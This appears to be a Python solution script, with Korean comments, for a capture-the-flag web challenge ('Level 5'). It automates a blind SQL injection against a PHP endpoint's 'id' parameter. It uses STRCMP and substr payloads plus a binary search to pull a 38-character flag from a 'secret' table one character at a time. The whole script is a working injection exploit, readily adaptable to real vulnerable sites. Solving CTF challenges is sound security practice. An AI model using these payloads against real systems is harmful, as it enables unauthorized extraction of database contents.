# Level 5 payload
import requests

# 1. 대상 타겟 정보 설정
url = "http://문제url.php" 
cookies = {
    'PHPSESSID': '본인 세션 키'
    # 메인 페이지 하단의 조건
    # '각 단계의 flag 는 당신 계정 전용(flag{md5})으로 발급'
}

# 2. 추출하고 싶은 쿼리
target_query = "SELECT flag FROM secret LIMIT 1"
# 3. 참 판별 문자열
success_marker = "해당 ID의 회원이 존재합니다."

print("[*] 블라인드 SQL 인젝션 시작...")

# 4. 플래그 길이 : md5 -> 32자리
# flag{32자리} -> 총 38자리
print("\n[*] 1. 플래그 길이 확인 중...")

flag_length = 38
payload = f"1' and !STRCMP(length(({target_query})), {flag_length}) -- "
response = requests.get(url, params={'id': payload}, cookies=cookies)
if success_marker not in response.text:
    print("[-] flag 길이가 38이 아닙니다.")
    flag_length = 40  # 실패 시 기본값 세팅
else:
    print(f"[+] 확인된 플래그 총 길이: {flag_length}글자")

# 5. 이진 탐색 및 STRCMP를 이용한 글자 추출
print("\n[*] 2. 플래그 내용 추출 중 (6번째 글자부터 시작)...")

# 앞의 flag{는 알고 있으므로 미리 입력
flag = "flag{"

# MD5에서 사용되는 16진수 문자
candidate_chars = "0123456789abcdef"

# 6~37번째 글자 추출
for position in range(6, flag_length):

    left = 0
    right = len(candidate_chars) - 1

    while left < right:

        mid = (left + right) // 2
        mid_char = candidate_chars[mid]

        payload = f"1' and !STRCMP(STRCMP(substr(({target_query}), {position}, 1), '{mid_char}'), 1) -- "
        params = {'id': payload}

        try:
            response = requests.get(url, params=params, cookies=cookies, timeout=5)

            # print(f"[Debug] Payload: {payload}")

            if success_marker in response.text:
                # 현재 문자가 mid_char보다 큰 경우
                left = mid + 1
            else:
                # 현재 문자가 mid_char보다 작거나 같은 경우
                right = mid

        except requests.exceptions.RequestException as e:
            print(f"[-] 에러 발생: {e}")
            continue

    found_alp = candidate_chars[left]
    flag += found_alp
    print(f"[+] {position}번째 글자 발견! -> '{found_alp}' (현재 플래그: {flag})")

# 6. 마지막 문자가 }인지 확인
if len(flag) == 37:

    # 마지막 문자가 }인지 확인
    payload = f"1' and !STRCMP(substr(({target_query}), {flag_length}, 1), '}}') -- "

    try:
        response = requests.get(url, params={'id': payload}, cookies=cookies, timeout=5)

        if success_marker in response.text:
            flag += "}"
            print("[+] 마지막 문자 '}' 확인 완료")
        else:
            print("[-] 마지막 문자가 '}'가 아닙니다.")

    except requests.exceptions.RequestException as e:
        print(f"[-] 에러 발생: {e}")

print(f"\n[★] 최종 추출된 플래그: {flag}")
